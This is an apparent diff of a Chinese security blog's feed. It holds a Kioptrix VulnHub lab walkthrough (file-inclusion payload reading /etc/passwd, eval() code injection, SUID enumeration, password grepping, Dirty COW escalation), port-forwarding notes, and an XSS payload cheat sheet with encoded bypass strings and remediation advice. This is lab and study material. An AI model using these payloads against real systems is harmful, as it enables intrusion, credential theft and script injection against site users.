+<p>​	如上图就加载了两个功能，第一个功能是安装，那主要功能肯定在<code>router.php</code>了，如下：<br><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1.png" alt="php"></p>
+<p>​	可以得出一个通用的结论如果参数名是 <code>?system=</code>、<code>?page=</code>、<code>?file=</code> 或 <code>?view=</code>，很可能是文件包含；后端开发者通常使用这个参数来决定加载哪个模块（比如 <code>Admin.php</code>、<code>Login.php</code>），当然这是16年前的代码了，放在现在肯定行不通了。</p>
+<p>​	如下证明<code>php</code>是<code>5.2.4</code></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/php%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7.png" alt="php"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: http://&lt;ip:port&gt;/index.php?system=../../../../../../etc/passwd%001</span><br></pre></td></tr></table></figure>
+
+<p>​	目前很少看到 “<code>url</code>即<code>api</code>“ 了，大多都是网页 “<code>Hash</code>路由+其他域名<code>api</code>“ 的实现</p>
+<table>
+<thead>
+<tr>
+<th><strong>截断方式</strong></th>
+<th><strong>依赖环境</strong></th>
+<th><strong>现代防御状态</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Null Byte (%00)</strong></td>
+<td>PHP &lt; 5.3.4</td>
+<td><strong>已失效</strong> (PHP 核心已加固)</td>
+</tr>
+<tr>
+<td><strong>Path Length</strong></td>
+<td>操作系统底层限制</td>
+<td><strong>极难实现</strong> (现代 PHP 会预校验)</td>
+</tr>
+<tr>
+<td><strong>RFI Query (?)</strong></td>
+<td>开启 URL 包含</td>
+<td><strong>已禁用</strong> (默认关闭 allow_url_include)</td>
+</tr>
+<tr>
+<td><strong>点号&#x2F;空格</strong></td>
+<td>旧版 Windows</td>
+<td><strong>已失效</strong></td>
+</tr>
+</tbody></table>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E8%B6%85%E7%AE%A1%E5%AF%86%E7%A0%81-1.png" alt="php"></p>
+<h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><p>代码还是那一串(危险函数<code>eval()</code>)：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">public function Router()&#123;</span><br><span class="line">	//Get page request (<span class="keyword">if</span> any)</span><br><span class="line">	$page = $this-&gt;getInputString(&quot;page&quot;, &quot;index&quot;);</span><br><span class="line">	</span><br><span class="line">	//Get plugin request (<span class="keyword">if</span> any)</span><br><span class="line">	$plugin = $this-&gt;getInputString(&quot;system&quot;, &quot;Page&quot;);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(file_exists(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;))&#123;</span><br><span class="line">		//Include Page fetcher</span><br><span class="line">		include(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;);</span><br><span class="line"></span><br><span class="line">		//Fetch the page and get over loading cache etc...</span><br><span class="line">		eval(&quot;new &quot;.$plugin.&quot;Starter(&#x27;&quot;.$page.&quot;&#x27;);&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>原本拼接是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?system=Admin</span><br><span class="line">拼接：</span><br><span class="line">eval(new AdminStarter(&#x27;index&#x27;);)</span><br><span class="line">注意，page是没有的话是默认的index</span><br></pre></td></tr></table></figure>
+
+<p>正常执行的<code>php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p>所以</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload:	/index.php?system=Page&amp;page=index&#x27;);phpinfo();/*</span></span><br><span class="line"><span class="comment">#拼接后的代码：</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new PageStarter(&#x27;index&#x27;);phpinfo();/*&#x27;);&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者			/index.php?system=Page&amp;page=&#x27;.phpinfo().&#x27;</span></span><br><span class="line"><span class="comment">#更加优雅  &#x27;. phpinfo() .&#x27;  取代了   &quot;.$page.&quot; 完成一次解析然后会返回一个布尔值 true  真是优雅啊~！！</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new PageStarter(&#x27;&#x27;.phpinfo().&#x27;&#x27;);&quot;</span>);</span><br><span class="line"><span class="comment">#想要传参就要解析.phpinfo().</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png" alt="RCE"></p>
+<h5 id="测试靶场"><a href="#测试靶场" class="headerlink" title="测试靶场"></a>测试靶场</h5><p>之后同理，反弹<code>shell</code>后提权，(好像<code>bash -i</code>用不了，<code>&gt;</code>用不了，<code>cd</code>用不了等等的，但是还好<code>wget</code>能用)</p>
+<p>利用文件包含执行代码：<br><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2.png" alt="RCE"></p>
+<p>然后就遇到了一堆<code>exp</code>用不了的情况了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#寻找系统中配置错误且带有特殊权限的可执行文件。</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步：调用 Python 启动 PTY</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kali键盘全转发</span></span><br><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到当前目录下所有的root关键字</span></span><br><span class="line">grep -rnw <span class="string">&quot;.&quot;</span> -e <span class="string">&quot;password&quot;</span></span><br><span class="line">grep -C 5 <span class="string">&quot;password&quot;</span> gconfig.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-1.png" alt="RCE"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-2.png" alt="RCE"></p>
+<p>然后可以在<code>root</code>账户的数据库里找到其他两个账号，然后尝试用<code>ht</code>编辑器直接更改<code>/etc/passwd</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第1步：设置变量</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2步：现在运行 ht 应该就能看到蓝色界面了</span></span><br><span class="line">/usr/local/bin/ht</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E7%BC%96%E8%BE%91%E5%99%A8ht.png" alt="RCE"></p>
+<p>或者直接使用<a href="https://www.exploit-db.com/exploits/40839">脏牛内核提权</a></p>
+<p>原理是条件竞争，使得数据直接写入了受保护的只读文件<code>/etc/passwd</code>，所以要稍微等一下，然后控制台需要正常一点</p>
+<p>注意：使用了脏牛<code>root</code>就会被覆盖了</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E-1.png" alt="RCE"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/masses0x1/p/15780876.html">vulnhub KioptrixVM3 靶场练习&amp;LotusCMS漏洞分析 - rpsate - 博客园</a></p>
+<p><a href="https://www.freebuf.com/news/170656.html">CTF实战 | Kioptrix（#3）靶机渗透测试 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://blog.csdn.net/m0_73812072/article/details/155023122">渗透测试——Kioptrix3靶机多种方法渗透提权（脏牛漏洞提权，手把手详细教程）-CSDN博客</a></p>
+<h3 id="Kioptrix-Level-4"><a href="#Kioptrix-Level-4" class="headerlink" title="Kioptrix Level 4"></a>Kioptrix Level 4</h3><p><code>web测试</code></p>
+<p><strong>配置</strong>：<a href="https://www.vulnhub.com/">vulnhub</a>只给了一个虚拟磁盘，下面是我的配置以供参考</p>
+<table>
+<thead>
+<tr>
+<th><strong>设置项</strong></th>
+<th><strong>我配的值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>磁盘类型</strong></td>
+<td><strong>IDE</strong></td>
+</tr>
+<tr>
+<td><strong>I&#x2F;O 控制器</strong></td>
+<td><strong>LSI Logic</strong></td>
+</tr>
+<tr>
+<td><strong>硬件兼容性</strong></td>
+<td><strong>Workstation 10.x</strong></td>
+</tr>
+<tr>
+<td><strong>版本</strong></td>
+<td>**Linux 2.6.x **</td>
+</tr>
+</tbody></table>
+<h5 id="信息搜集-3"><a href="#信息搜集-3" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h5><p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_4/nmap-1.png"></p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>Red team</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>next主题的自定义文件</title>
+    <url>/2026/02/09/next%E4%B8%BB%E9%A2%98%E7%9A%84%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>记录一下<code>hexo</code>的<code>next</code>主题的一些文件是在哪些位置，以防下次想改又要去找，至于怎么改，丢给文本模型跑就行了</p>
+<p><code>NexT version 8.21.1</code></p>
+<span id="more"></span>
+
+<h1 id="1-位置"><a href="#1-位置" class="headerlink" title="1-位置"></a>1-位置</h1><h2 id="1-自定义样式"><a href="#1-自定义样式" class="headerlink" title="1&gt;自定义样式"></a>1&gt;自定义样式</h2><p>next主题下面的<code>_config.yml</code></p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.njk</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.njk</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.njk</span></span><br><span class="line">  <span class="comment">#postBodyStart: source/_data/post-body-start.njk</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.njk</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.njk</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="comment">#style: source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#style: source/_data/styles.styl</span><br><span class="line">用于更改栏目的透明度、鼠标悬停时的效果、优化手机端的体验都可以从这里改</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#variable: source/_data/variables.styl</span><br><span class="line">圆角设置等</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#bodyEnd: source/_data/body-end.njk</span><br><span class="line">页面上新增标签按钮啥的</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，<code>source/_data/body-end.njk</code>等这些是<code>blog</code>下面的<code>source</code>不是<code>next</code>主题下的<code>source</code></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\source\_data\body-end.njk</span><br></pre></td></tr></table></figure>
+
+<p>其他的我没用到，暂时就不说了</p>
+<h2 id="2-固有的样式更改"><a href="#2-固有的样式更改" class="headerlink" title="2&gt;固有的样式更改"></a>2&gt;固有的样式更改</h2><h3 id="Hexo-NexT-主题侧边栏"><a href="#Hexo-NexT-主题侧边栏" class="headerlink" title="Hexo NexT 主题侧边栏"></a><code>Hexo NexT</code> 主题侧边栏</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\themes\next\layout\_partials\sidebar\site-overview.njk</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-置顶、排序、分页"><a href="#3-置顶、排序、分页" class="headerlink" title="3&gt;置顶、排序、分页"></a>3&gt;置顶、排序、分页</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#如果改了根目录下的config里的order_by还不行的话可以试试这个</span><br><span class="line">你博客的绝对路径\blog\node_modules\hexo-generator-index\lib\generator.js</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<a href="https://hubojing.github.io/dhygztfl/">Hexo根据更新时间修改文章排序机制</a></p>
+<p>待续。。。</p>
+]]></content>
+      <categories>
+        <category>article</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代理记录</title>
+    <url>/2025/08/27/%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	今天琢磨端口映射的时候懒得输入内网地址，想直接用回显地址找到端口服务的时候硬是找不到</p>
+<h6 id="1-回显地址默认不经代理的解决办法"><a href="#1-回显地址默认不经代理的解决办法" class="headerlink" title="1&gt;回显地址默认不经代理的解决办法"></a>1&gt;回显地址默认不经代理的解决办法</h6><p><a href="https://stackoverflow.com/questions/57419408/how-to-make-firefox-use-a-proxy-server-for-localhost-connections#:~:text=You%20have%20to%20change%20another,in%20about%3Aconfig">stackoverflow网址中的解决办法</a></p>
+<p>简单来说就是进入浏览器的高级配置的首选项进行更改，主要原因在于浏览器的配置默认回显地址不经过代理，如下以火狐浏览器为例：</p>
+<p><img src="/../image/proxy-/1.png"></p>
+<span id="more"></span>
+
+<h1 id="1-局域网映射端口"><a href="#1-局域网映射端口" class="headerlink" title="1-局域网映射端口"></a>1-局域网映射端口</h1><h6 id="1-内网穿透-局域网端口映射"><a href="#1-内网穿透-局域网端口映射" class="headerlink" title="1&gt;内网穿透-&gt;局域网端口映射"></a>1&gt;内网穿透-&gt;局域网端口映射</h6><p>假设我连接了内网的wifi，然后访问它的web服务192.168.123.1:8080，现在我电脑开热点给其他人，让其他人访问内网的web服务，我怎么将192.168.123.1映射到我的热点（热点为nat模式）</p>
+<p>#<strong>解决方案</strong></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line">---</span><br><span class="line">#如果更多的端口映射</span><br><span class="line"><span class="comment">rem 映射Web服务 (HTTP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">80</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射HTTPS服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">443</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">443</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射远程桌面 (RDP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">3389</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">3389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SSH服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">22</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射你之前设置的8080端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SMB文件共享</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">445</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">445</span></span><br><span class="line"></span><br><span class="line">##linux</span><br><span class="line">#启用IP转发（临时）</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">#永久</span><br><span class="line">sudo nano /etc/sysctl.conf</span><br><span class="line">#更新</span><br><span class="line">sudo sysctl -p</span><br><span class="line"># 将目标为热点IP:<span class="number">8080</span>的包，转发到内网服务器</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -i wlan1 --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看转发的表-windows</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">#删除对应的表</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span></span><br><span class="line">#清除转发表</span><br><span class="line">netsh interface portproxy reset</span><br><span class="line">#增加对应的转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">172</span>.<span class="number">16</span>.<span class="number">5</span>.<span class="number">2</span> connectport=<span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<p>当然直接用<strong>Ngrok &#x2F; FRP (Fast Reverse Proxy) &#x2F; ew</strong>等穿透工具都可以</p>
+<p>无互联网开热点的解决方案如下：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=allow ssid=MyHotspot key=MyPassword123</span><br><span class="line">#开启</span><br><span class="line">netsh wlan <span class="built_in">start</span> hostednetwork</span><br><span class="line">#关闭</span><br><span class="line">netsh wlan stop hostednetwork</span><br><span class="line">#查看</span><br><span class="line">netsh wlan show hostednetwork</span><br><span class="line">#删除</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=disallow</span><br><span class="line">#检查是否可以</span><br><span class="line">netsh wlan show drivers</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>payload记录</title>
+    <url>/2025/04/24/payload%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><h2 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a>简单payload</h2><p><strong>自动弹窗优先级</strong></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">svg &gt; img &gt; iframe &gt; object &gt; embed &gt; video/audio &gt; details &gt; marquee &gt; math</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   #标签外常用#base64加密</span><br><span class="line">   &lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">   #img#强制错误弹</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加载弹窗</span><br><span class="line">   &lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加密payload</span><br><span class="line">   &lt;svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line">   #svg内嵌代码1</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;animate onbegin=alert(1) attributeName=x /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码2</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;set onbegin=alert(1) /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码3</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;foreignObject onload=alert(1)&gt;&lt;/foreignObject&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #点击  # JS 协议</span><br><span class="line">   &lt;a href=&quot;javascript:alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">   &lt;a data-url=&quot;&quot; onclick=&quot;alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">   #normal</span><br><span class="line">   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">   #鼠标移动</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot;&gt;hover me&lt;/a&gt;</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot; style=&quot;display:block;width:200px;height:50px;background:red&quot;&gt;</span><br><span class="line">       </span><br><span class="line">   #鼠标移动代码2</span><br><span class="line">   &lt;math&gt;</span><br><span class="line">     &lt;mtext onmouseover=alert(1)&gt;X&lt;/mtext&gt;</span><br><span class="line">   &lt;/math&gt;</span><br><span class="line">   </span><br><span class="line">   #特定标签</span><br><span class="line">   &lt;iframe src=about:blank onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">   </span><br><span class="line">   #强制本页无限弹窗</span><br><span class="line">   #聚焦时弹xss，强制聚焦</span><br><span class="line">   &lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line">   #非 常见标签</span><br><span class="line">       #万能嵌入器#早期网页：&lt;embed src=&quot;movie.swf&quot;&gt;</span><br><span class="line">       &lt;embed src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">       #详细信息</span><br><span class="line">       &lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">       #h5视频标签</span><br><span class="line">       &lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">       #h5音频标签</span><br><span class="line">       &lt;audio src=x onerror=alert(1)&gt;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#常见反射型</span><br><span class="line">	&quot;+onmouseover=alert/*abcd*/`xss`</span><br><span class="line">	</span><br><span class="line">	&quot;&quot;; alert`<span class="number">1</span>`; //&quot;;</span><br><span class="line">	<span class="number">0</span>||alert<span class="variable">%0D`1`//</span></span><br><span class="line"><span class="variable">	%</span><span class="number">0</span>a`$&#123;alert%<span class="number">0</span>D(<span class="number">1</span>)&#125;`</span><br><span class="line">	onload=alert`<span class="number">1</span>` //</span><br><span class="line"></span><br><span class="line">#流程中含有转义步骤</span><br><span class="line">	\u0022\u003b+alert\u00601\u0060\u003b+//</span><br></pre></td></tr></table></figure>
+
+<p>注：html解析<strong>HTML 实体编码</strong></p>
+<p>​	例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;quot;   html解码成	&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注：<strong>JavaScript Unicode 转义（\uXXXX）</strong> 和 <strong>URL 编码（%XX）</strong></p>
+<p>xxs需要注意被墙了可以尝试从转义或者解析角度注入</p>
+<p>当然文件预览的方向也可以尝试</p>
+<p>可以通过<a href="https://hackerone.com/hacktivity/cwe_discovery?id=CWE-79">网址</a>来查看以前大佬们提交的漏洞</p>
+<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
+<p><a href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
+<p>用ai改了一下，python3也可以用</p>
+<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
+<h3 id="若页面存在预览和上传"><a href="#若页面存在预览和上传" class="headerlink" title="若页面存在预览和上传"></a>若页面存在预览和上传</h3><p>则<a href="https://github.com/cliayn/cliayn.github.io/blob/master/tool/xss/xss.pdf">xss.pdf</a></p>
+<h3 id="经典示例："><a href="#经典示例：" class="headerlink" title="经典示例："></a>经典示例：</h3><h5 id="get参数变更"><a href="#get参数变更" class="headerlink" title="get参数变更"></a>get参数变更</h5><p>示例poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.xxx.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br><span class="line">	解析：</span><br><span class="line"></span><br><span class="line">abc&#x27;%3breturn+false&#125;)%3b&#125;)%3balert`xss ;&lt;%2fscript&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="图片名称变更"><a href="#图片名称变更" class="headerlink" title="图片名称变更"></a>图片名称变更</h5><p>payload:       \ “&gt;&lt;img src&#x3D;1 onerror&#x3D;&quot; URL&#x3D;String;</p>
+<p><img src="/../image/xss/expected_request.png"></p>
+<h2 id="xss修复建议"><a href="#xss修复建议" class="headerlink" title="xss修复建议"></a>xss修复建议</h2><table>
+<thead>
+<tr>
+<th><strong>维度</strong></th>
+<th><strong>安全策略与行为</strong></th>
+<th><strong>技术细节与风险点说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>编码解析</strong></td>
+<td><strong>单次实体解码</strong></td>
+<td>HTML 实体（如 <code>&lt;</code>）会被还原为 <code>&lt;</code>，但 <strong>URL 编码（%xx）不会被解析</strong>。这种设计彻底切断了“解码-&gt;绕过-&gt;再解码”的二次解析攻击链。</td>
+</tr>
+<tr>
+<td><strong>属性过滤</strong></td>
+<td><strong>属性级白名单</strong></td>
+<td>仅保留 <code>href</code> 和 <code>src</code> 等必要路径属性。<strong>所有 <code>on\*</code> 事件、<code>style</code> 及自定义属性全部抹除</strong>，防止 CSS 表达式或 JS 事件注入。</td>
+</tr>
+<tr>
+<td><strong>协议限制</strong></td>
+<td><strong>严格协议校验</strong></td>
+<td>拦截 <code>javascript:</code> 和 <code>data:</code> 伪协议。采用<strong>先解码后校验</strong>的逻辑，防止利用编码后的非法协议绕过正则匹配。</td>
+</tr>
+<tr>
+<td><strong>组件重写</strong></td>
+<td><strong>主动安全配置</strong></td>
+<td>对 Flash 等插件不只是过滤，而是<strong>重写属性</strong>。强制设置 <code>allowscriptaccess=&quot;never&quot;</code>（禁调 JS）和 <code>allownetworking=&quot;internal&quot;</code>（限制外联）。</td>
+</tr>
+<tr>
+<td><strong>资源控制</strong></td>
+<td><strong>内容安全策略 (CSP)</strong></td>
+<td>配合域名白名单，限制仅加载官方脚本。这是防止外部恶意脚本注入的最后一道防线。</td>
+</tr>
+<tr>
